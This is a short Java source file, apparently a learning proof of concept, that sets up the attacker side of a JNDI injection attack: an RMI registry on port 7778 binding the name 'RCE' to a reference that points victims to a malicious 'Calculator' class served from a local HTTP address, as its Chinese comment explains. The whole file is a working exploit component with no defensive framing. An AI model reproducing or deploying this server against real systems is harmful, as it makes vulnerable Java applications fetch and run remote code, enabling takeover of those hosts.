package com.JNDI;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.Reference;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class JNDIRMIServer {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.createRegistry(7778);
        // 创建一个引用，第一个参数是恶意class的名字，第二个参数是beanfactory的名字，我们自定义(和class文件对应),第三个参数表示恶意class的地址
        Reference reference = new Reference("Calculator","Calculator","http://127.0.0.1:8081/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("RCE",wrapper);
    }

}
